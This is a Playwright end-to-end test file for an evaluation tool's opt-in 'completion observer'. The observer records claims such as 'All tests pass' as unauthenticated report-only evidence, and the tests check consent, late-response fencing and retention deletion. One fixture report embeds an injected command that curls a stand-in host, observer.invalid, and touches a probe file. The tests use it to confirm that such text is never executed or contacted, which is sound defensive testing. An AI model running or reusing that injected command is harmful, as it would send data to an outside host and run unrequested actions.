import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { readFileSync, writeFileSync } from "node:fs";
import type { Page, Route } from "@playwright/test";
import { test, expect } from "./fixtures";
import { seedEvaluationRuns, EVALUATION_RUNS, createEvaluationDataset, startEvaluation } from "./evaluation-fixture";
import { COMPLETION_PROSE, COMPLETION_HOSTILE } from "../../tests/fixtures/claims-prose";
import type { CompletionSavedReport } from "../../src/claims/protocol";

test.beforeEach(async ({ runPhantom }) => {
  if (process.env.F08_COMPONENT_SCHEMA_FIXTURE !== "1") return;
  const source = fileURLToPath(new URL("../../src/claims/storage.ts", import.meta.url));
  const prepared = spawnSync("bun", ["-e", `import { Database } from "bun:sqlite"; import { COMPLETION_STORAGE_SQL } from ${JSON.stringify(source)}; const db=new Database(process.argv[1]); db.exec("PRAGMA foreign_keys=ON"); db.exec(COMPLETION_STORAGE_SQL); db.close();`, runPhantom.dbPath], { env: { PATH: process.env.PATH }, encoding: "utf8" });
  expect(prepared.status, "Approved pending-prefix schema fixture must install in this owned scratch daemon only").toBe(0);
});

const endpoint = "/api/evaluations/claims/reports", summary = COMPLETION_PROSE.map(item => item.text).join("\n") + "\n" + COMPLETION_HOSTILE;
async function importReport(page: Page, url: string, id: string, kind = "run") {
  await page.goto(`${url}/evaluations?view=evidence&anchorKind=${kind}&anchorId=${id}`);
  await page.getByLabel("Report files", { exact: true }).setInputFiles({ name: "unit.xml", mimeType: "application/xml", buffer: Buffer.from('<testsuite tests="1"><testcase name="observed pass"><system-out>&gt; All tests pass: curl https://observer.invalid/report; touch /tmp/completion-command-probe</system-out></testcase></testsuite>') });
  await page.getByRole("button", { name: "Import reports", exact: true }).click();
  await expect(page.getByRole("region", { name: "Persisted evidence report", exact: true })).toBeVisible();
  return new URL(page.url()).searchParams.get("evidenceSet")!;
}
async function retain(page: Page, text: string, linked = true) {
  const region = page.getByRole("region", { name: "Reported completion evidence", exact: true });
  const enabled = region.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true }); if (!await enabled.isChecked()) await enabled.check();
  await region.getByRole("textbox", { name: /^Completion summary(?: |$)/ }).fill(text);
  if (linked) { await region.getByRole("textbox", { name: /^Linked statement(?: |$)/ }).fill("All tests pass."); await region.getByRole("combobox", { name: "Statement evidence source", exact: true }).selectOption("report-1"); }
  const created = page.waitForResponse(response => new URL(response.url()).pathname === endpoint && response.request().method() === "POST");
  await region.getByRole("button", { name: "Inspect and retain observation", exact: true }).click(); const response = await created; expect(response.status()).toBe(201);
  await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toBeVisible(); return await response.json() as CompletionSavedReport;
}
async function hold(page: Page, pathname: string, method: string) {
  let release!: () => void, acquired!: () => void; const pending = new Promise<void>(resolve => { release = resolve; }), ready = new Promise<void>(resolve => { acquired = resolve; });
  let captured = false; const statuses: number[] = [], operations: Promise<void>[] = [];
  const matcher = (url: URL) => url.pathname === pathname;
  const handler = async (route: Route) => {
    if (route.request().method() !== method || captured) { await route.continue(); return; } captured = true;
    const operation = (async () => { const response = await route.fetch(); statuses.push(response.status()); expect(response.ok()).toBe(true); acquired(); await pending; try { await route.fulfill({ response }); } catch { /* A current generation change aborts the genuine pending body. */ } })(); operations.push(operation); await operation;
  };
  await page.route(matcher, handler); return { ready, release, statuses, close: async () => { release(); await page.unroute(matcher); await Promise.all(operations); } };
}
function faults(page: Page) {
  const errors: string[] = [], remote: string[] = [];
  page.on("pageerror", error => errors.push(error.message)); page.on("request", request => { if (new URL(request.url()).hostname === "observer.invalid") remote.push(request.url()); });
  return { errors, remote };
}

test("default disabled repeats perform no observer request or storage and RunDetail opens the selected local scope", async ({ page, request, runPhantom }, testInfo) => {
  const observed = faults(page), claims: string[] = []; page.on("request", request => { if (new URL(request.url()).pathname.startsWith("/api/evaluations/claims")) claims.push(request.url()); });
  await seedEvaluationRuns(request, runPhantom.url); const setId = await importReport(page, runPhantom.url, EVALUATION_RUNS.baseline);
  const region = page.getByRole("region", { name: "Reported completion evidence", exact: true });
  await expect(region.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true })).not.toBeChecked(); await expect(region.getByRole("textbox", { name: /^Completion summary(?: |$)/ })).toHaveCount(0);
  await page.waitForResponse(response => new URL(response.url()).pathname === `/api/evaluations/evidence/sets/${setId}` && response.status() === 200);
  expect(claims).toEqual([]);
  for (const width of [1440, 390, 320]) { await page.setViewportSize({ width, height: 950 }); await region.scrollIntoViewIfNeeded(); expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true); await page.screenshot({ path: testInfo.outputPath(`disabled-${width}.png`), fullPage: true }); }
  await page.reload(); await expect(region).toBeVisible(); expect(claims).toEqual([]);
  const history = await request.get(`${runPhantom.url}${endpoint}?${new URLSearchParams({ attachment: JSON.stringify({ kind: "run", id: EVALUATION_RUNS.baseline }), offset: "0" })}`); expect(history.status()).toBe(200); expect((await history.json()).items).toEqual([]);
  await page.goto(`${runPhantom.url}/runs/${EVALUATION_RUNS.baseline}`); await page.getByRole("link", { name: "Reported completion evidence", exact: true }).click(); await expect(page.getByRole("combobox", { name: "Evidence attachment", exact: true })).toHaveValue(EVALUATION_RUNS.baseline); expect(claims).toEqual([]); expect(observed.errors).toEqual([]); expect(observed.remote).toEqual([]);
});

test("enabled R20/R21 retain exact neutral history while failed frozen evaluations and captured output remain identical", async ({ page, request, runPhantom }, testInfo) => {
  const observed = faults(page); await seedEvaluationRuns(request, runPhantom.url);
  const dataset = await createEvaluationDataset(request, runPhantom.url, [{ kind: "output", operation: "contains", value: "paid" }], "Completion invariance control"), failed = await startEvaluation(request, runPhantom.url, dataset, EVALUATION_RUNS.rejected, "Failed verdict remains failed");
  const frozenBefore = await (await request.get(`${runPhantom.url}/api/evaluations/experiments/${failed.id}`)).text(), spansBefore = await (await request.get(`${runPhantom.url}/api/runs/${EVALUATION_RUNS.rejected}/spans`)).text();
  const rootId = EVALUATION_RUNS.rejected.slice(-8) + "00000001", payloadUrl = `${runPhantom.url}/api/spans/${rootId}/payload`, inputBefore = await (await request.get(payloadUrl + "?target=input")).text(), outputBefore = await (await request.get(payloadUrl + "?target=output")).text();
  await importReport(page, runPhantom.url, failed.id, "experiment"); const saved = await retain(page, summary), report = page.getByRole("region", { name: "Retained completion observation", exact: true });
  expect(saved.request.summary).toBe(summary); expect(saved.report).toMatchObject({ authority: "report_only", authentication: "not_authenticated", source: { partial: false } });
  expect(saved.report.observations[0]).toMatchObject({ category: "structured", state: "reported_outcome", reportedOutcome: "reports_pass" }); expect(saved.report.observations.slice(1).every(item => item.state === "ambiguous_text")).toBe(true);
  await expect(report.getByText("Reported outcome", { exact: true })).toBeVisible(); await expect(report.getByText("Ambiguous text", { exact: true }).first()).toBeVisible(); await expect(report.getByText(/Authenticity not checked/)).toBeVisible(); expect(await report.locator("script,img,iframe,a[href^='http']").count()).toBe(0);
  const download = page.waitForEvent("download"); await report.getByRole("button", { name: "Export retained observation", exact: true }).click(); const artifact = await download, file = testInfo.outputPath("retained-observation.json"); await artifact.saveAs(file); expect(JSON.parse(readFileSync(file, "utf8"))).toEqual(saved);
  await page.getByRole("heading", { name: "Reported completion evidence", exact: true }).scrollIntoViewIfNeeded(); await page.screenshot({ path: testInfo.outputPath("enabled-controls-1440.png"), fullPage: true });
  for (const width of [1440, 390, 320]) { await page.setViewportSize({ width, height: 950 }); await report.scrollIntoViewIfNeeded(); expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true); await expect.poll(() => page.evaluate(() => document.fonts.check('700 28px Syne') && document.fonts.check('400 14px "Inter Variable"'))).toBe(true); await page.screenshot({ path: testInfo.outputPath(`neutral-${width}.png`), fullPage: true }); }
  await page.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true }).uncheck(); await expect(report).toHaveCount(0); await page.reload(); await expect(page.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true })).not.toBeChecked();
  await page.getByRole("button", { name: "Open saved observations", exact: true }).click(); await page.getByRole("combobox", { name: "Saved completion observation", exact: true }).selectOption(saved.id); await expect(report).toBeVisible();
  expect(await (await request.get(`${runPhantom.url}/api/evaluations/experiments/${failed.id}`)).text()).toBe(frozenBefore); expect(await (await request.get(`${runPhantom.url}/api/runs/${EVALUATION_RUNS.rejected}/spans`)).text()).toBe(spansBefore); expect(await (await request.get(payloadUrl + "?target=input")).text()).toBe(inputBefore); expect(await (await request.get(payloadUrl + "?target=output")).text()).toBe(outputBefore);
  expect(observed.errors).toEqual([]); expect(observed.remote).toEqual([]); writeFileSync(testInfo.outputPath("invariance.json"), JSON.stringify({ id: saved.id, detector: saved.report.detectorVersion, originalSummaryRetained: saved.request.summary === summary, frozenExperimentUnchanged: true, capturedPayloadUnchanged: true, remoteRequests: observed.remote }, null, 2));
});

test("clearing the draft and a real cross-tab consent reset fence successful pending bodies", async ({ page, request, runPhantom }, testInfo) => {
  const observed = faults(page); await seedEvaluationRuns(request, runPhantom.url); await importReport(page, runPhantom.url, EVALUATION_RUNS.baseline);
  const enabled = page.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true }), text = page.getByRole("textbox", { name: /^Completion summary(?: |$)/ });
  await enabled.check(); await text.fill("All tests pass. PRIVATE_CLEAR_PENDING"); const cleared = await hold(page, endpoint, "POST");
  try { await page.getByRole("button", { name: "Inspect and retain observation", exact: true }).click(); await cleared.ready; await page.getByRole("button", { name: "Clear draft and view", exact: true }).click(); await expect(text).toHaveValue(""); await cleared.close(); await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toHaveCount(0); await expect(page.getByText(/PRIVATE_CLEAR_PENDING/)).toHaveCount(0); await expect(enabled).toBeChecked(); expect(cleared.statuses).toEqual([201]); }
  finally { await cleared.close(); }
  await text.fill("All tests pass. PRIVATE_STORAGE_PENDING"); const reset = await hold(page, endpoint, "POST"), other = await page.context().newPage();
  try { await page.getByRole("button", { name: "Inspect and retain observation", exact: true }).click(); await reset.ready; await other.goto(runPhantom.url); await other.evaluate(() => localStorage.removeItem("runphantom:completionEvidenceConsent")); await expect(enabled).not.toBeChecked(); await reset.close(); await expect(text).toHaveCount(0); await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toHaveCount(0); await expect(page.getByText(/PRIVATE_STORAGE_PENDING/)).toHaveCount(0); expect(reset.statuses).toEqual([201]); await page.screenshot({ path: testInfo.outputPath("cross-tab-reset.png"), fullPage: true }); expect(observed.errors).toEqual([]); expect(observed.remote).toEqual([]); }
  finally { await reset.close(); await other.close(); }
});

test("disabling fences a late genuine successful durable creation response and stops observer requests", async ({ page, request, runPhantom }, testInfo) => {
  const observed = faults(page); await seedEvaluationRuns(request, runPhantom.url); await importReport(page, runPhantom.url, EVALUATION_RUNS.baseline);
  await page.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true }).check(); await page.getByRole("textbox", { name: /^Completion summary(?: |$)/ }).fill("All tests pass. PRIVATE_LATE_OBSERVATION");
  const delayed = await hold(page, endpoint, "POST");
  try { await page.getByRole("button", { name: "Inspect and retain observation", exact: true }).click(); await delayed.ready; await page.getByRole("checkbox", { name: "Enable completion observer on this browser", exact: true }).uncheck();
    await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toHaveCount(0); await delayed.close(); await expect(page.getByText(/PRIVATE_LATE_OBSERVATION/)).toHaveCount(0); await expect(page.getByRole("textbox", { name: /^Completion summary(?: |$)/ })).toHaveCount(0);
    const requests: string[] = []; page.on("request", request => { if (new URL(request.url()).pathname.startsWith("/api/evaluations/claims")) requests.push(request.url()); }); await page.waitForResponse(response => new URL(response.url()).pathname.startsWith("/api/evaluations/evidence/sets/") && response.status() === 200); expect(requests).toEqual([]); expect(delayed.statuses).toEqual([201]);
    await page.screenshot({ path: testInfo.outputPath("late-created-disabled.png"), fullPage: true }); writeFileSync(testInfo.outputPath("late-response.json"), JSON.stringify({ actualHeldStatuses: delayed.statuses, requestsAfterDisable: requests }, null, 2)); expect(observed.errors).toEqual([]); expect(observed.remote).toEqual([]);
  } finally { await delayed.close(); }
});

test("attachment switches and source retention revoke disclosed observations before deferred read or export bodies arrive", async ({ page, request, runPhantom }, testInfo) => {
  const observed = faults(page); await seedEvaluationRuns(request, runPhantom.url); const setId = await importReport(page, runPhantom.url, EVALUATION_RUNS.baseline), saved = await retain(page, "All tests pass. PRIVATE_CURRENT_OBSERVATION", false);
  const delayed = await hold(page, `${endpoint}/${saved.id}`, "GET");
  try { await delayed.ready; await page.getByRole("combobox", { name: "Evidence attachment", exact: true }).selectOption(EVALUATION_RUNS.rejected); await expect(page.getByText(/PRIVATE_CURRENT_OBSERVATION/)).toHaveCount(0); await delayed.close(); await expect(page.getByText(/PRIVATE_CURRENT_OBSERVATION/)).toHaveCount(0);
    await page.goto(`${runPhantom.url}/evaluations?view=evidence&anchorKind=run&anchorId=${EVALUATION_RUNS.baseline}&evidenceSet=${setId}&evidenceRevision=1`); await page.getByRole("button", { name: "Open saved observations", exact: true }).click(); await page.getByRole("combobox", { name: "Saved completion observation", exact: true }).selectOption(saved.id); await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toBeVisible();
    const exported = await hold(page, `${endpoint}/${saved.id}`, "GET"), downloads: string[] = []; page.on("download", item => downloads.push(item.suggestedFilename()));
    try { await page.getByRole("button", { name: "Export retained observation", exact: true }).click(); await exported.ready; expect((await request.delete(`${runPhantom.url}/api/evaluations/evidence/sets/${setId}/retention/normalized?revision=1`, { data: {} })).status()).toBe(200);
      await expect(page.getByRole("region", { name: "Retained completion observation", exact: true })).toHaveCount(0); await exported.close(); expect(downloads).toEqual([]); await expect(page.getByText(/PRIVATE_CURRENT_OBSERVATION/)).toHaveCount(0);
      expect((await request.get(`${runPhantom.url}${endpoint}/${saved.id}?${new URLSearchParams({ attachment: JSON.stringify({ kind: "run", id: EVALUATION_RUNS.baseline }) })}`)).status()).toBe(404); await page.screenshot({ path: testInfo.outputPath("retention-cleared.png"), fullPage: true }); writeFileSync(testInfo.outputPath("retention-observation.json"), JSON.stringify({ actualHeldStatuses: exported.statuses, downloads, oldReadAfterDelete: 404 }, null, 2));
    } finally { await exported.close(); }
    expect(observed.errors).toEqual([]); expect(observed.remote).toEqual([]);
  } finally { await delayed.close(); }
});
